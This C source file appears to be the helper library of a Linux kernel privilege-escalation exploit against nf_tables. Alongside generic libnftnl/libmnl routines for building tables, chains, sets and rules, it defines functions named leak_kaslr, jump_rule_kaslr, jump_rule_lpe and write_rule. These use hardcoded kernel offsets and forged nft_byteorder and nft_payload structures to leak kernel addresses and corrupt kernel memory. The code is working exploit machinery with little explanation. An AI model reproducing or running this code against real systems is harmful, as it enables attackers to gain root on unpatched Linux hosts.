/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * David Bouman (pql) wrote this file.  As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.   Signed, David.
 * ----------------------------------------------------------------------------
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sched.h>
#include <signal.h>


#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include "helpers.h"


#define nft_meta_set_ops 0x25584c0
#define nft_orderbyte_ops 0x2557e80
#define nft_payload_ops 0x25580c0



static uint64_t default_batch_req_handler(struct mnl_socket* nl, int portid, int table_seq)
{
    char buf[MNL_SOCKET_BUFFER_SIZE];

    int ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));

    while (ret > 0) {
        ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL);
        if (ret <= 0) break;
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }
    return ret;
}

int64_t send_batch_request(struct mnl_socket* nl, uint16_t msg, uint16_t msg_flags, uint16_t family, void** object, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct mnl_nlmsg_batch* batch = mnl_nlmsg_batch_start(buf, sizeof buf);

    uint8_t msg_type = msg & 0xff;
    uint8_t nft_type = (msg >> 8) & 0xff;
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);
    int table_seq = *seq;
    struct nlmsghdr* nlh;

    if (result_handler == NULL) {
        result_handler = default_batch_req_handler;
    }
    
    if (nft_type == NFT_TYPE_SET)
    {
    	//printf("SET\n");
    	//printf("msg_type:%d\n", msg_type);
	nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
						  msg_type, family,
						  msg_flags | NLM_F_ACK, (*seq)++
						  );   		 	
    }
   	else
   	{
   		//printf("OTHER\n");
		nlh = nftnl_nlmsg_build_hdr(
		    mnl_nlmsg_batch_current(batch),
		    msg_type, family,
		    msg_flags | NLM_F_ACK, (*seq)++
		);
    }
    
    switch(nft_type) {
        case NFT_TYPE_TABLE:
            nftnl_table_nlmsg_build_payload(nlh, *object);
            nftnl_table_free(*object);
            break;
        case NFT_TYPE_CHAIN:
            nftnl_chain_nlmsg_build_payload(nlh, *object);
            nftnl_chain_free(*object);
            break;
        case NFT_TYPE_RULE:
            nftnl_rule_nlmsg_build_payload(nlh, *object);
            nftnl_rule_free(*object);
            break;
        case NFT_TYPE_SET:
        	//printf("TYPE SET\n");
		 	nftnl_set_nlmsg_build_payload(nlh, *object);
			nftnl_set_free(*object);       	
        	break;
        default:
            return -1; // will increment seq wrongly... no prob i guess
    }  

    *object = NULL;

    mnl_nlmsg_batch_next(batch);
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), (*seq)++);
    mnl_nlmsg_batch_next(batch);

    int ret = mnl_socket_sendto(
        nl,
        mnl_nlmsg_batch_head(batch),
        mnl_nlmsg_batch_size(batch)
    );

    if (ret < 0) {
        perror("mnl_socket_send");
        return -1;
    }

    int portid = mnl_socket_get_portid(nl);

    mnl_nlmsg_batch_stop(batch);

    result_handler(nl, portid, table_seq);
}

struct nftnl_table* build_table(char* name, uint16_t family)
{
    struct nftnl_table* t = nftnl_table_alloc();
    
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

    return t;
}

struct nftnl_chain* build_chain(char* table_name, char* chain_name, struct unft_base_chain_param* base_param)
{
    struct nftnl_chain* c;

    c = nftnl_chain_alloc();

    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table_name);

    if (base_param) {
        nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, base_param->hook_num);
        nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, base_param->prio);
    }

    return c;
    
}


struct nftnl_rule* build_rule(char* table_name, char* chain_name, uint16_t family, uint64_t* handle)
{
    struct nftnl_rule* r = NULL;
    uint8_t proto;
    
    r = nftnl_rule_alloc();

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
    
    if (handle) {
        nftnl_rule_set_u64(r, NFTNL_RULE_POSITION, *handle);
    }

    return r;

}

// for some reason my editor does not recognize these
#define NFTA_BITWISE_OP NFTA_BITWISE_XOR + 1
#define NFTA_BITWISE_DATA NFTA_BITWISE_OP + 1

void rule_add_meta(struct nftnl_rule* r, uint32_t key, uint32_t sreg)
{
	struct nftnl_expr* e;
	e= nftnl_expr_alloc("meta");
	nftnl_expr_set_u32(e, NFTNL_EXPR_META_KEY, key);
	nftnl_expr_set_u32(e, NFTNL_EXPR_META_SREG, sreg);
	nftnl_rule_add_expr(r, e);
}


void rule_add_bit_shift(
    struct nftnl_rule* r, uint32_t shift_type, uint32_t bitwise_len,
    uint32_t bitwise_sreg, uint32_t bitwise_dreg, void* data, uint32_t data_len)
{
    
    if(bitwise_len > 0xff) {
        puts("bitwise_len > 0xff");
        exit(EXIT_FAILURE);
    }

    struct nftnl_expr* e;
    e = nftnl_expr_alloc("bitwise");

    nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, bitwise_sreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, bitwise_dreg);
    nftnl_expr_set_u32(e, NFTA_BITWISE_OP, shift_type);
    nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, bitwise_len);
    nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_memcpy(struct nftnl_rule* r, uint32_t len, uint32_t sreg, uint32_t dreg)
{
    uint32_t data = 0;
    rule_add_bit_shift(r, NFT_BITWISE_LSHIFT, len, sreg, dreg, &data, sizeof(data));
}

void rule_add_payload(struct nftnl_rule* r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("payload");

    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);

    nftnl_rule_add_expr(r, e);
}

void rule_add_byteorder(struct nftnl_rule* r, uint32_t sreg, uint32_t dreg, uint32_t op, uint32_t len, uint32_t size)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("byteorder");

    nftnl_expr_set_u32(e, NFTNL_EXPR_BYTEORDER_DREG, dreg);
    nftnl_expr_set_u32(e, NFTNL_EXPR_BYTEORDER_SREG, sreg);
    nftnl_expr_set_u32(e, NFTNL_EXPR_BYTEORDER_OP, op);
    nftnl_expr_set_u32(e, NFTNL_EXPR_BYTEORDER_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_BYTEORDER_SIZE, size);

    nftnl_rule_add_expr(r, e);
}

void rule_add_cmp(struct nftnl_rule* r, uint32_t op, uint32_t sreg, void* data, size_t data_len)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("cmp");

    nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
    nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
    nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_data(struct nftnl_rule* r, uint32_t dreg, void* data, size_t data_len)
{
    struct nftnl_expr* e;
    
    e = nftnl_expr_alloc("immediate");

    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, dreg);
    nftnl_expr_set_data(e, NFTA_IMMEDIATE_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

void rule_add_immediate_verdict(struct nftnl_rule* r, uint32_t verdict, char* chain_name)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("immediate");

    // dreg = 0 -> verdict
    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); 

    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict);

    if (verdict == NFT_GOTO || verdict == NFT_JUMP) {
        nftnl_expr_set_str(e, NFTNL_EXPR_IMM_CHAIN, chain_name);
    }

    nftnl_rule_add_expr(r, e);
}

void rule_add_dynset(struct nftnl_rule* r, uint32_t sreg, uint32_t data, uint32_t op, const char *name)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("dynset");
	
	nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_SREG_KEY, sreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_SREG_DATA, data);
	nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_OP, op);
	nftnl_expr_set_str(e, NFTNL_EXPR_DYNSET_SET_NAME, name);
	nftnl_expr_set_u32(e, NFTNL_EXPR_DYNSET_SET_ID, 1);
	
	nftnl_rule_add_expr(r, e);
}

void rule_add_range(struct nftnl_rule* r,const void *from_data, const void *to_data)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("range");
	nftnl_expr_set_u32(e, NFTNL_EXPR_RANGE_SREG, 8);
	nftnl_expr_set_u32(e, NFTNL_EXPR_RANGE_OP, NFT_RANGE_EQ);
	nftnl_expr_set(e, NFTNL_EXPR_RANGE_FROM_DATA, from_data, 0x10);
	nftnl_expr_set(e, NFTNL_EXPR_RANGE_TO_DATA, to_data, 0x10);
	nftnl_rule_add_expr(r, e);	
}

struct nftnl_set* build_set(char *table_name, char *set_name, uint16_t family)
{
    // Create a new set object
    struct nftnl_set *set = nftnl_set_alloc();

    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_MAP);
    nftnl_set_set_u32(set, NFTNL_SET_DATA_TYPE, NFT_DATA_VALUE);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 4);
    nftnl_set_set_u32(set, NFTNL_SET_DATA_LEN, 4);
    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set, NFTNL_SET_ID, 1);

    //nftnl_set_add_expr(set, expr);
    return set;
}


int create_table(struct mnl_socket* nl, char* name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    
    struct nftnl_table* t = build_table(name, family);

    return send_batch_request(
        nl,
        NFT_MSG_NEWTABLE | (NFT_TYPE_TABLE << 8),
        NLM_F_CREATE, family, (void**)&t, seq,
        result_handler
    );
}

int create_chain(struct mnl_socket* nl, char* chain_name, char* table_name, uint16_t family, struct unft_base_chain_param* base_param, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_chain* c = build_chain(chain_name, table_name, base_param);

    return send_batch_request(
        nl,
        NFT_MSG_NEWCHAIN | (NFT_TYPE_CHAIN << 8),
        NLM_F_CREATE, family, (void**)&c, seq,
        result_handler  
    );
}

int create_set(struct mnl_socket* nl, char *table_name, char* name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
    struct nftnl_set* s = setup_set(family, table_name, name);
    
    return send_batch_request(
        nl,
        NFT_MSG_NEWSET | (NFT_TYPE_SET << 8),
        NLM_F_CREATE, family, (void**)&s, seq,
        result_handler
    );
}

int delete_set(struct mnl_socket* nl, char *table_name, char* name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
	struct nftnl_set* s = nftnl_set_alloc();
	if (s == NULL) {
		perror("OOM");
		return 1;
	}
	
	nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(s, NFTNL_SET_NAME, name);

    return send_batch_request(
        nl,
        NFT_MSG_DELSET | (NFT_TYPE_SET << 8),
        NLM_F_ACK, family, (void**)&s, seq,
        result_handler
    );
}

int delete_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
	struct nftnl_rule *r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("OOM");
		return 1;
	}
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	
	return send_batch_request(
        nl,
        NFT_MSG_DELRULE | (NFT_TYPE_RULE << 8),
        NLM_F_ACK, family, (void**)&r, seq,
        result_handler
    );
	
}

int delete_chain(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
	struct nftnl_chain *t;
	t = nftnl_chain_alloc();
	if (t == NULL) {
		perror("OOM");
		return 1;
	}
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	
	return send_batch_request(
        nl,
        NFT_MSG_DELCHAIN | (NFT_TYPE_CHAIN << 8),
        NLM_F_ACK, family, (void**)&t, seq,
        result_handler
    );	
}

int delete_table(struct mnl_socket* nl, char* table_name, uint16_t family, int* seq, uint64_t (*result_handler)(struct mnl_socket*, int, int))
{
	struct nftnl_table *t;
	t = nftnl_table_alloc();
	if (t == NULL) {
		perror("OOM");
		return 1;
	}
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);
	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
		return send_batch_request(
        nl,
        NFT_MSG_DELTABLE | (NFT_TYPE_TABLE << 8),
        NLM_F_ACK, family, (void**)&t, seq,
        result_handler
    );
}

static struct nftnl_set *setup_set(uint8_t family, const char *table,
				 const char *name)
{
	struct nftnl_set *s = NULL;

	s = nftnl_set_alloc();
	if (s == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

    nftnl_set_set_str(s, NFTNL_SET_TABLE, table);
    nftnl_set_set_str(s, NFTNL_SET_NAME, name);
    nftnl_set_set_u32(s, NFTNL_SET_FLAGS, NFT_SET_MAP);
    nftnl_set_set_u32(s, NFTNL_SET_DATA_TYPE, NFT_DATA_VALUE);
    nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, 4);
    nftnl_set_set_u32(s, NFTNL_SET_DATA_LEN, 4);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(s, NFTNL_SET_ID, 1);

	return s;
}

int leak_rule(struct mnl_socket* nl, char *table_name, char *chain_name, char *set_name, uint16_t family, uint64_t* handle, int* seq)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	rule_add_byteorder(r, 18, 8, NFT_BYTEORDER_HTON, 24, 2);
	
	char data[4] = {'\x00', '\x00', '\x00', '\x01'};
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 14, NFT_DYNSET_OP_ADD, set_name);

	data[3] = '\x02';
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 15, NFT_DYNSET_OP_ADD, set_name);
	
	data[3] = '\x03';
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 16, NFT_DYNSET_OP_ADD, set_name);	
	
	data[3] = '\x04';
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 17, NFT_DYNSET_OP_ADD, set_name);
	
	data[3] = '\x05';
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 18, NFT_DYNSET_OP_ADD, set_name);
	
	data[3] = '\x06';
	rule_add_immediate_data(r, 8, data, 4);
	rule_add_dynset(r, 8, 19, NFT_DYNSET_OP_ADD, set_name);
	
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }	
}

int jump_rule(struct mnl_socket* nl, char *table_name, char *chain_name, uint16_t family, uint64_t* handle, int* seq)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	char data[4] = {'\x01', '\x01', '\x01', '\x01'};
	rule_add_immediate_data(r, 8, data, 4);	
	rule_add_meta(r, NFT_META_NFTRACE, 8);
	rule_add_immediate_verdict(r, NFT_JUMP, "poc_chain");
	//rule_add_immediate_verdict(r, NFT_RETURN, chain_name);

    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }		
}

int jump_rule_kaslr(struct mnl_socket* nl, char *table_name, char *chain_name, uint16_t family, uint64_t* handle, int* seq, uint64_t *module)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	rule_add_immediate_verdict(r, NFT_JUMP, "leak-chain");
	
	char from_data[0x10];
	memset(from_data, 0, 0x10);
	from_data[0] = '\x40';
	uint64_t byteorder_ops = *module + nft_orderbyte_ops;
	memcpy(from_data + 8, &byteorder_ops, 8);
	
	char to_data[0x10];
	memset(to_data, 0, 0x10);
	/*
	struct nft_byteorder {
	u8			sreg;
	u8			dreg;
	enum nft_byteorder_ops	op:8;
	u8			len;
	u8			size;
	};
	
	size | len | dreg | sreg
	*/
	
	uint64_t data = 0x0808010880;
	uint64_t meta_ops = *module + nft_meta_set_ops;
	memcpy(to_data, &data, 8);
	memcpy(to_data + 8, &meta_ops, 8);
	
	rule_add_range(r, from_data, to_data);
	
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }	
}

int jump_rule_lpe(struct mnl_socket* nl, char *table_name, char *chain_name, uint16_t family, uint64_t* handle, int* seq, uint64_t *module)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	rule_add_immediate_verdict(r, NFT_JUMP, "lpe-chain");
	
	char from_data[0x10];
	memset(from_data, 0, 0x10);
	from_data[0] = '\x40';
	uint64_t payload_ops = *module + nft_payload_ops;
	memcpy(from_data + 8, &payload_ops, 8);
	
	char to_data[0x10];
	memset(to_data, 0, 0x10);
	/*
	struct nft_payload {
		enum nft_payload_bases	base:8;
		u8			offset;
		u8			len;
		u8			dreg;
	};
	*/
	
	uint64_t data = 0x80b81c01;
	uint64_t meta_ops = *module + nft_meta_set_ops;
	memcpy(to_data, &data, 8);
	memcpy(to_data + 8, &meta_ops, 8);
	
	rule_add_range(r, from_data, to_data);
	
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }	
}

int leak_kaslr(struct mnl_socket* nl, char *table_name, char *chain_name, char *set_name, uint16_t family, uint64_t* handle, int* seq)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	rule_add_dynset(r,  NFT_REG32_04, NFT_REG32_05,NFT_DYNSET_OP_ADD, set_name);
	
	int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }
}

int write_rule(struct mnl_socket* nl, char *table_name, char *chain_name, uint16_t family, uint64_t* handle, int* seq, uint32_t *chain_low, uint32_t *chain_high, uint32_t *rule_low, uint32_t *rule_high, uint32_t *last_rule_low, uint32_t *last_rule_high)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	rule_add_immediate_data(r, 8, chain_low, 4);
	rule_add_immediate_data(r, 9, chain_high, 4);
	*rule_low = *rule_low - 0x52;
	rule_add_immediate_data(r, 10, rule_low, 4);
	rule_add_immediate_data(r, 11, rule_high, 4);
	*last_rule_low = *rule_low + 8;
	rule_add_immediate_data(r, 12, last_rule_low, 4);
	rule_add_immediate_data(r, 13, last_rule_high, 4);
	rule_add_byteorder(r, 8, 16, NFT_BYTEORDER_HTON, 28, 2);	
	int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }	
} 

int write_rule_kaslr(struct mnl_socket* nl, char *table_name, char *chain_name, uint16_t family, uint64_t* handle, int* seq, uint32_t *chain_low, uint32_t *chain_high, uint32_t *rule_low, uint32_t *rule_high, uint32_t *last_rule_low, uint32_t *last_rule_high)
{
	struct nftnl_rule* r = build_rule(table_name, chain_name, NFPROTO_IPV4, NULL);
	
	rule_add_immediate_data(r, 8, chain_low, 4);
	rule_add_immediate_data(r, 9, chain_high, 4);
	*rule_low = *rule_low - 0x28;
	rule_add_immediate_data(r, 10, rule_low, 4);
	rule_add_immediate_data(r, 11, rule_high, 4);
	rule_add_immediate_data(r, 12, last_rule_low, 4);
	rule_add_immediate_data(r, 13, last_rule_high, 4);
	rule_add_byteorder(r, 8, 16, NFT_BYTEORDER_HTON, 28, 2);	
	int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err) {
        perror("send_batch_request");
        return err;
    }	
} 




struct child_proc {
    struct child_proc* next;
    pid_t pid;
};

static struct child_proc *children;


static void add_child(pid_t pid)
{
    struct child_proc* child = malloc(sizeof *child);
    child->pid = pid;
    child->next = children;
    children = child;
}

static void kill_children(int sig)
{
    //printf("[pid=%d] killing children!\n", getpid());

    struct child_proc* current_child = children;
    while (current_child) {
        kill(current_child->pid, SIGTERM);
        current_child = current_child->next;
    }

    exit(EXIT_SUCCESS);
}

pid_t setup_listener(char* ip_string, uint16_t port, int (*handler)(int))
{
    
    int err;

    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (s < 0) {
        perror("socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)");
        exit(EXIT_FAILURE);
    }

    int reuse_addr = 1;

    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &reuse_addr, sizeof reuse_addr);

    struct sockaddr_in addr;
    inet_aton(ip_string, &addr.sin_addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    err = bind(s, (struct sockaddr*)&addr, sizeof(addr));
    
    if (err < 0) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    printf("Started listener on [%s:%d] (udp)\n", ip_string, port);

    pid_t pid = fork();
    if (pid) { 
        // parent process
        add_child(pid);   
        return pid;
    }
	if (handler != NULL)
    	handler(s);

    exit(EXIT_SUCCESS);

}

int stop_listener(pid_t pid)
{
    
    if (kill(pid, SIGTERM)) {
        perror("kill");
        return -1;
    };

    struct child_proc* next_child = children;
    struct child_proc* current_child = NULL;

    while (next_child) {    
        
        if (next_child->pid == pid) {
            
            struct child_proc** prev = current_child == NULL ? &children : &current_child;
            if (current_child == NULL) {
                prev = &children;
            } else {
                prev = &current_child;
            }

            (*prev)->next = next_child->next;
            break;

        }

        current_child = next_child;
        next_child = next_child->next;
    }

    return 0;
}

int connect_to(char* ip_string, uint16_t port)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (s < 0) {
        perror("socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)");
        return -1;
    }
    struct sockaddr_in conn_addr;
    conn_addr.sin_port = htons(port);
    inet_aton(ip_string, &conn_addr.sin_addr);
    conn_addr.sin_family = AF_INET;

    int err = connect(s, (struct sockaddr*)&conn_addr, sizeof conn_addr);
    if (err < 0) {
        perror("connect");
        return -1;
    }
    
    printf("Successfully connected to [%s:%hd] (udp)\n", ip_string, port);

    return s;
}

void hexdump(void* data, size_t len, unsigned int n_columns)
{

    uint8_t* bdata = data;

    for (int i = 0; i < len; ++i) {
        printf("%.2hhx ", bdata[i]);

        if ( (i+1) % n_columns == 0) {
            putchar('\n');
        }
    }
}
